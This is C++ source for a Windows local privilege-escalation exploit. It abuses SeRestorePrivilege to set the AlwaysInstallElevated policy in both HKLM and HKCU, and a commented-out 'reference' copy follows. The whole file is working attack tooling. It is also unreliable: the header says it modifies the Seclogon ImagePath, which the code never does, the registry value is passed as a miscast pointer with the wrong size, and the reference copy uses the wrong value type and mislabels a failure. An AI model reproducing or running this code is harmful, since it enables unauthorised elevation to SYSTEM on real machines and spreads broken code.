#include <iostream>
#include <Windows.h>

/*
 Exploit SeRestorePrivilege by modifying Seclogon ImagePath
 Author: @xct_de
 */

int main(int argc, char* argv[])
{
    std::string value;
    /*
    if (argc > 1) {
        value = argv[1];
    }
    else {
        std::cout << "Usage: SeRestoreAbuse.exe <payload>" << std::endl;
    }
    */
    // create registry key or get handle
    HKEY hKey;
    LONG lResult;
    HKEY hKey2;
    LONG lResult2;
    DWORD byte = 0x01;
    system("echo trying to make LM key");
    lResult = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        0,
        NULL,
        REG_OPTION_BACKUP_RESTORE,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL);
    std::cout << "RegCreateKeyExA result for Local Machine: " << lResult << std::endl;
    if (lResult != 0) {
        system("echo failed to make LM key");
        exit(0);
    }
    system("echo LM key made");

    // set value
    lResult = RegSetValueExA(
        hKey,
        "AlwaysInstallElevated",
        0,
        REG_DWORD,
        (const BYTE*)byte,
        sizeof((const BYTE*)byte));
    std::cout << "RegSetValueExA result for Local Machine: " << lResult << std::endl;
    if (lResult != 0) {
        system("echo LM key value set brokey");
        exit(0);
    }
    system("echo LM key value set");


    system("echo trying to make CU key");
    lResult2 = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        0,
        NULL,
        REG_OPTION_BACKUP_RESTORE,
        KEY_SET_VALUE,
        NULL,
        &hKey2,
        NULL);
    std::cout << "RegCreateKeyExA result for Current User: " << lResult2 << std::endl;
    if (lResult2 != 0) {
        system("echo failed to make CU key");
        exit(0);
    }
    system("echo CU key made");

    // set value
    lResult2 = RegSetValueExA(
        hKey2,
        "AlwaysInstallElevated",
        0,
        REG_DWORD,
        (const BYTE*)byte,
        sizeof((const BYTE*)byte));
    std::cout << "RegSetValueExA result for Current User: " << lResult2 << std::endl;

    if (lResult2 != 0) {
        system("echo CU key value set brokey");
        exit(0);
    }
    system("echo CU key value set");
    // check keys
    system("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
}

/* code that works for rerference
#include <iostream>
#include <Windows.h>


 Exploit SeRestorePrivilege by modifying Seclogon ImagePath
 Author: @xct_de


int main(int argc, char* argv[])
{
    std::string value;

    // create registry key or get handle
    HKEY hKey;
    LONG lResult;
    system("echo trying to make key");
    lResult = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        0,
        NULL,
        REG_OPTION_BACKUP_RESTORE,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL);
    std::cout << "RegCreateKeyExA result: " << lResult << std::endl;
    if (lResult != 0) {
        system("echo failed to make key");
        exit(0);
    }
    system("echo Key made");

    // set value
    lResult = RegSetValueExA(
        hKey,
        "AlwaysInstallElevated",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(value.c_str()),
        value.length() + 1);
    std::cout << "RegSetValueExA result: " << lResult << std::endl;
    if (lResult != 0) {
        system("echo Key value set");
        exit(0);
    }
    system("echo Key made");

    // start service
    system("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
}
*/
